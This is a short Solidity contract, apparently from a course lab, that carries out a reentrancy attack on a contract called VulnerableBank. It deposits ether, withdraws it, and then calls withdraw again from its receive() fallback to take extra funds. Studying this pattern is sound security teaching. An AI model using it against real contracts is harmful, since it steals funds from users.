pragma solidity ^0.8.0;

import "./csc403.sol";
contract AttackerRe{

    VulnerableBank public bank;
    uint256 amount;
    bool internal drainedBal;
    uint public count;

    constructor(address _bank){
        bank = VulnerableBank(_bank);
    }

    function attack() external payable{
        amount = msg.value;
        bank.deposit{value: amount}();
        bank.withdraw(amount);
    }

   receive() external payable {
    if (count ==0 ) {
        count = 1;
        bank.withdraw(amount);
    }
} 
    }
